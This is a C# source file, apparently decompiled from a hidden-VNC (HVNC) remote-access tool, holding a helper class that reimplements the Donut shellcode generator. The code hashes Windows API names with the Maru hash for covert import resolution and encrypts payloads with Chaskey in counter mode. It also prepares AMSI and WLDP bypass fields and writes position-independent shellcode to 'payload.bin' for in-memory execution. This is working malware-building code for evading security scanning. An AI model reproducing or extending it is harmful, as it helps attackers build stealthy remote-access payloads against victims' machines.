using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using BirdBrainmofo.HVNC.StubUtils.Donut.Structs;
using PeNet;

namespace BirdBrainmofo.HVNC.StubUtils.Donut
{
    public class Helper
    {
        [StructLayout(LayoutKind.Explicit)]
        public struct GStruct0
        {
            [FieldOffset(0)]
            public unsafe fixed byte _003Cb_003Ee__FixedBuffer_0[16];

            [FieldOffset(0)]
            public unsafe fixed uint _003Cw_003Ee__FixedBuffer_0[2];
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct GStruct1
        {
            [FieldOffset(0)]
            public unsafe fixed uint _003Cw_003Ee__FixedBuffer_0[2];

            [FieldOffset(0)]
            public unsafe fixed ulong _003Cq_003Ee__FixedBuffer_0[2];
        }

        public static int ParseConfig(ref DSConfig config, ref DSFileInfo dsfileInfo_0)
        {
            int num = ParseInputFile(new string(config.file).Replace("\0", ""), ref dsfileInfo_0);
            if (num != 0)
            {
                return num;
            }
            config.mod_type = dsfileInfo_0.type;
            return 0;
        }

        public static int ParseInputFile(string file, ref DSFileInfo dsfileInfo_0)
        {
            Path.GetExtension(file);
            dsfileInfo_0.type = 4;
            dsfileInfo_0.arch = -1;
            PeFile peFile = new PeFile(file);
            if (peFile.Is32Bit)
            {
                dsfileInfo_0.arch = 1;
            }
            else
            {
                dsfileInfo_0.arch = 2;
            }
            dsfileInfo_0.type = 2;
            Copy(dsfileInfo_0.ver, peFile.MetaDataHdr.Version);
            return 0;
        }

        public static void APIImports(ref DSInstance inst)
        {
            inst.api.hash = new ulong[64];
            Dictionary<string, List<string>> dictionary = new Dictionary<string, List<string>>
            {
                {
                    "kernel32.dll",
                    new List<string> { "LoadLibraryA", "GetProcAddress", "GetModuleHandleA", "VirtualAlloc", "VirtualFree", "VirtualQuery", "VirtualProtect", "Sleep", "MultiByteToWideChar", "GetUserDefaultLCID" }
                },
                {
                    "oleaut32.dll",
                    new List<string> { "SafeArrayCreate", "SafeArrayCreateVector", "SafeArrayPutElement", "SafeArrayDestroy", "SafeArrayGetLBound", "SafeArrayGetUBound", "SysAllocString", "SysFreeString", "LoadTypeLib" }
                },
                {
                    "wininet.dll",
                    new List<string> { "InternetCrackUrlA", "InternetOpenA", "InternetConnectA", "InternetSetOptionA", "InternetReadFile", "InternetCloseHandle", "HttpOpenRequestA", "HttpSendRequestA", "HttpQueryInfoA" }
                },
                {
                    "mscoree.dll",
                    new List<string> { "CorBindToRuntime", "CLRCreateInstance" }
                },
                {
                    "ole32.dll",
                    new List<string> { "CoInitializeEx", "CoCreateInstance", "CoUninitialize" }
                }
            };
            for (int i = 0; i < dictionary.Count; i++)
            {
                for (int j = 0; j < dictionary.ElementAt(i).Value.Count; j++)
                {
                    ulong num = Maru(dictionary.ElementAt(i).Key, ref inst);
                    ulong num2 = Maru(dictionary.ElementAt(i).Value[j], ref inst) ^ num;
                    inst.api.hash[inst.api_cnt++] = num2;
                }
            }
            inst.dll_0 = new DLL[8];
            for (int k = 0; k < inst.dll_0.Length; k++)
            {
                inst.dll_0[k] = new DLL
                {
                    dll_name = new char[32]
                };
            }
            string[] array = new string[4] { "ole32.dll", "oleaut32.dll", "wininet.dll", "mscoree.dll" };
            for (int l = 0; l < array.Length; l++)
            {
                char[] array2 = new char[32];
                Copy(array2, array[l]);
                for (int m = 0; m < array2.Length; m++)
                {
                    inst.dll_0[l].dll_name[m] = array2[m];
                }
                inst.dll_cnt = array.Length;
            }
        }

        public static string GetError(int ret)
        {
            string result = "";
            switch (ret)
            {
                case 0:
                    result = "[*] Success";
                    break;
                case 1:
                    result = "[-] File not found";
                    break;
                case 2:
                    result = "[-] File is empty";
                    break;
                case 3:
                    result = "[-] Cannot open file";
                    break;
                case 4:
                    result = "[-] File is invalid";
                    break;
                case 5:
                    result = "[-] File is a .NET DLL. Donut requires a class and method";
                    break;
                case 6:
                    result = "[-] No memory available";
                    break;
                case 7:
                    result = "[-] Invalid architecture specified";
                    break;
                case 8:
                    result = "[-] Invalid URL";
                    break;
                case 9:
                    result = "[-] Invalid URL length";
                    break;
                case 10:
                    result = "[-] Invalid parameter";
                    break;
                case 11:
                    result = "[-] Error generating random values";
                    break;
                case 12:
                    result = "[-] Unable to locate DLL function provided. Names are case Constants.sensitive";
                    break;
                case 13:
                    result = "[-] Target architecture cannot support selected DLL/EXE file";
                    break;
                case 14:
                    result = "[-] You've supplied parameters for an unmanaged DLL. Donut also requires a DLL function";
                    break;
                case 15:
                    result = "[-] Invalid bypass option specified";
                    break;
                case 16:
                    result = "[-] This file has no relocation information required for in-memory execution.";
                    break;
            }
            return result;
        }

        public dynamic InitStruct(string type)
        {
            switch (type)
            {
                case "DSConfig":
                    {
                        DSConfig dSConfig = default(DSConfig);
                        dSConfig.arch = 3;
                        dSConfig.bypass = 3;
                        dSConfig.inst_type = 1;
                        dSConfig.mod_len = 0uL;
                        dSConfig.inst_len = 0uL;
                        dSConfig.pic = IntPtr.Zero;
                        dSConfig.pic_len = 0uL;
                        dSConfig.cls = new char[256];
                        dSConfig.domain = new char[256];
                        dSConfig.method = new char[256];
                        dSConfig.modname = new char[256];
                        dSConfig.file = new char[256];
                        dSConfig.runtime = new char[256];
                        dSConfig.url = new char[256];
                        dSConfig.param = new char[2304];
                        dSConfig.outfile = new char[256];
                        DSConfig dSConfig2 = dSConfig;
                        Copy(dSConfig2.outfile, "payload.bin");
                        return dSConfig2;
                    }
                case "DSModule":
                    {
                        DSModule dSModule = default(DSModule);
                        dSModule.runtime = new byte[512];
                        dSModule.cls = new byte[512];
                        dSModule.method = new byte[512];
                        dSModule.domain = new byte[512];
                        dSModule.sig = new char[256];
                        DSModule dSModule2 = dSModule;
                        dSModule2.gstruct2_0 = new GStruct2[9];
                        for (int i = 0; i < dSModule2.gstruct2_0.Length; i++)
                        {
                            dSModule2.gstruct2_0[i] = new GStruct2
                            {
                                param = new byte[512]
                            };
                        }
                        return dSModule2;
                    }
                case "DSInstance":
                    {
                        DSInstance dSInstance = default(DSInstance);
                        dSInstance.sig = new char[256];
                        dSInstance.amsiInit = new char[16];
                        dSInstance.amsiScanBuf = new char[16];
                        dSInstance.amsiScanStr = new char[16];
                        dSInstance.clr = new char[8];
                        dSInstance.wldp = new char[16];
                        dSInstance.wldpQuery = new char[32];
                        dSInstance.wldpIsApproved = new char[32];
                        dSInstance.wscript = new char[16];
                        dSInstance.wscript_exe = new char[32];
                        DSInstance dSInstance2 = dSInstance;
                        dSInstance2.amsi = default(AMSI);
                        dSInstance2.amsi.char_0 = new char[8];
                        dSInstance2.key.ctr = new byte[16];
                        dSInstance2.key.byte_0 = new byte[16];
                        dSInstance2.mod_key.ctr = new byte[16];
                        dSInstance2.mod_key.byte_0 = new byte[16];
                        return dSInstance2;
                    }
                default:
                    return 0;
            }
        }

        public unsafe static void WriteOutput(ref DSConfig config)
        {
            try
            {
                FileStream fileStream = new FileStream(String(config.outfile), FileMode.Create, FileAccess.Write);
                UnmanagedMemoryStream unmanagedMemoryStream = new UnmanagedMemoryStream((byte*)(void*)config.pic, Convert.ToInt32(config.pic_cnt));
                unmanagedMemoryStream.CopyTo(fileStream);
                unmanagedMemoryStream.Close();
                fileStream.Close();
            }
            catch
            {
                Console.WriteLine("Failed to write payload to file");
            }
        }

        public unsafe static ulong Maru(string input, ref DSInstance inst)
        {
            byte[] array = new byte[Constants.MARU_BLK_LEN];
            for (int i = 0; i < array.Length; i++)
            {
                array[i] = 0;
            }
            IntPtr intPtr = Marshal.UnsafeAddrOfPinnedArrayElement(array, 0);
            byte[] bytes = Encoding.UTF8.GetBytes(input + "\0");
            ulong num = inst.ulong_0;
            int num2 = 0;
            int num3 = 0;
            bool flag = false;
            GStruct0 gstruct0_ = default(GStruct0);
            while (!flag)
            {
                if (bytes[num2] != 0 && num2 != Constants.MARU_MAX_STR)
                {
                    gstruct0_._003Cb_003Ee__FixedBuffer_0[num3] = bytes[num2];
                    num3++;
                    num2++;
                }
                else
                {
                    Buffer.MemoryCopy(intPtr.ToPointer(), gstruct0_._003Cb_003Ee__FixedBuffer_0 + num3, Marshal.SizeOf(typeof(GStruct0)), Constants.MARU_BLK_LEN - num3);
                    gstruct0_._003Cb_003Ee__FixedBuffer_0[num3] = 128;
                    if (num3 >= Constants.MARU_BLK_LEN - 4)
                    {
                        num ^= Maru_Crypt(gstruct0_, num);
                        Buffer.MemoryCopy(intPtr.ToPointer(), gstruct0_._003Cb_003Ee__FixedBuffer_0, Marshal.SizeOf(typeof(GStruct0)), Constants.MARU_BLK_LEN);
                    }
                    gstruct0_._003Cw_003Ee__FixedBuffer_0[Constants.MARU_BLK_LEN / 4 - 1] = Convert.ToUInt32(num2 * 8);
                    num3 = Constants.MARU_BLK_LEN;
                    flag = true;
                }
                if (num3 == Constants.MARU_BLK_LEN)
                {
                    num ^= Maru_Crypt(gstruct0_, num);
                    num3 = 0;
                }
            }
            return num;
        }

        public unsafe static ulong Maru_Crypt(GStruct0 gstruct0_0, ulong ulong_0)
        {
            uint[] array = new uint[4];
            uint[] array2 = new uint[4];
            byte[] array3 = new byte[16];
            for (int i = 0; i < 16; i++)
            {
                array3[i] = gstruct0_0._003Cb_003Ee__FixedBuffer_0[i];
            }
            Buffer.BlockCopy(array3, 0, array2, 0, 16);
            GStruct1 gStruct = default(GStruct1);
            gStruct._003Cq_003Ee__FixedBuffer_0[0] = ulong_0;
            for (uint num = 0u; num < 4; num++)
            {
                array[num] = array2[num];
            }
            for (uint num = 0u; num < 27; num++)
            {
                ref uint fixedElementField = ref gStruct._003Cw_003Ee__FixedBuffer_0[0];
                fixedElementField = (((gStruct._003Cw_003Ee__FixedBuffer_0[0] >> 8) | (gStruct._003Cw_003Ee__FixedBuffer_0[0] << 24)) + gStruct._003Cw_003Ee__FixedBuffer_0[1]) ^ array[0];
                gStruct._003Cw_003Ee__FixedBuffer_0[1] = ((gStruct._003Cw_003Ee__FixedBuffer_0[1] >> 29) | (gStruct._003Cw_003Ee__FixedBuffer_0[1] << 3)) ^ gStruct._003Cw_003Ee__FixedBuffer_0[0];
                uint num2 = array[3];
                array[3] = (((array[1] >> 8) | (array[1] << 24)) + array[0]) ^ num;
                array[0] = ((array[0] >> 29) | (array[0] << 3)) ^ array[3];
                array[1] = array[2];
                array[2] = num2;
            }
            return gStruct._003Cq_003Ee__FixedBuffer_0[0];
        }

        public static void Encrypt(byte[] byte_0, byte[] ctr, IntPtr data, ulong size)
        {
            int num = Convert.ToInt32(size);
            byte[] array = new byte[16];
            byte[] array2 = new byte[16];
            byte[] array3 = new byte[size];
            for (int i = 0; i < num; i++)
            {
                array3[i] = Marshal.ReadByte(data, i);
            }
            int num2 = 0;
            while (num > 0)
            {
                int j;
                for (j = 0; j < 16; j++)
                {
                    array2[j] = ctr[j];
                }
                array = Chaskey(byte_0, array2);
                int num3 = ((num > 16) ? 16 : num);
                for (j = 0; j < num3; j++)
                {
                    array3[j + num2] ^= array[j];
                }
                num -= num3;
                num2 += 16;
                j = 16;
                if (ctr[15] == byte.MaxValue)
                {
                    if (ctr[14] == byte.MaxValue)
                    {
                        ctr[13] = Convert.ToByte(ctr[13] + 1);
                        ctr[14] = Convert.ToByte(0);
                        ctr[15] = Convert.ToByte(0);
                    }
                    else
                    {
                        ctr[14] = Convert.ToByte(ctr[14] + 1);
                        ctr[15] = Convert.ToByte(0);
                    }
                }
                else
                {
                    ctr[15] = Convert.ToByte(ctr[15] + 1);
                }
            }
            for (int k = 0; k < Convert.ToInt32(size); k++)
            {
                Marshal.WriteByte(data + k, 0, array3[k]);
            }
        }

        public static byte[] Chaskey(byte[] byte_0, byte[] datain)
        {
            uint[] array = new uint[4];
            uint[] array2 = new uint[4];
            Buffer.BlockCopy(byte_0, 0, array, 0, 16);
            Buffer.BlockCopy(datain, 0, array2, 0, 16);
            for (int i = 0; i < 4; i++)
            {
                array2[i] ^= array[i];
            }
            for (int j = 0; j < 16; j++)
            {
                array2[0] += array2[1];
                array2[1] = ((array2[1] >> 27) | (array2[1] << 5)) ^ array2[0];
                array2[2] += array2[3];
                array2[3] = ((array2[3] >> 24) | (array2[3] << 8)) ^ array2[2];
                array2[2] += array2[1];
                array2[0] = ((array2[0] >> 16) | (array2[0] << 16)) + array2[3];
                array2[3] = ((array2[3] >> 19) | (array2[3] << 13)) ^ array2[0];
                array2[1] = ((array2[1] >> 25) | (array2[1] << 7)) ^ array2[2];
                array2[2] = (array2[2] >> 16) | (array2[2] << 16);
            }
            for (int k = 0; k < 4; k++)
            {
                array2[k] ^= array[k];
            }
            return array2.SelectMany(BitConverter.GetBytes).ToArray();
        }

        public static void PUT_BYTE(byte insertbyte, ref DSConfig config)
        {
            Marshal.WriteByte(config.pic + config.pic_cnt, (new byte[2] { 0, insertbyte })[1]);
            config.pic_cnt++;
        }

        public static void PUT_WORD(byte[] sarr, ref DSConfig config)
        {
            IntPtr intPtr = config.pic + config.pic_cnt;
            for (int i = 0; i < 4; i++)
            {
                Marshal.WriteByte(intPtr + i, sarr[i]);
                config.pic_cnt++;
            }
        }

        public static void PUT_BYTES(byte[] sarr, int cnt, ref DSConfig config)
        {
            IntPtr intPtr = config.pic + config.pic_cnt;
            for (int i = 0; i < cnt; i++)
            {
                Marshal.WriteByte(intPtr + i, sarr[i]);
                config.pic_cnt++;
            }
        }

        public static void PUT_INST(IntPtr instptr, int cnt, ref DSConfig config)
        {
            IntPtr intPtr = config.pic + config.pic_cnt;
            for (int i = 0; i < cnt; i++)
            {
                Marshal.WriteByte(intPtr + i, Marshal.ReadByte(instptr + i));
                config.pic_cnt++;
            }
            Marshal.FreeHGlobal(instptr);
        }

        public static string RandomString(int length)
        {
            Random random = new Random();
            return new string((from string_0 in Enumerable.Repeat("HMN34P67R9TWCXYF", length)
                               select string_0[random.Next(string_0.Length)]).ToArray());
        }

        public static byte[] RandomBytes(int length)
        {
            byte[] array = new byte[length];
            new RNGCryptoServiceProvider().GetBytes(array);
            return array;
        }

        public static void Unicode(byte[] dest, string buff)
        {
            byte[] array = Encoding.Convert(Encoding.ASCII, Encoding.Unicode, Encoding.ASCII.GetBytes(buff));
            Array.Copy(array, dest, array.Length);
        }

        public static string String(char[] source)
        {
            return new string(source).Replace("\0", "");
        }

        public static void Copy(char[] dest, string source)
        {
            Array.Copy(source.ToCharArray(), 0, dest, 0, source.ToCharArray().Length);
        }

        public static void Copy(byte[] dest, string source)
        {
            byte[] bytes = Encoding.ASCII.GetBytes(source);
            Array.Copy(bytes, 0, dest, 0, bytes.Length);
        }
    }
}
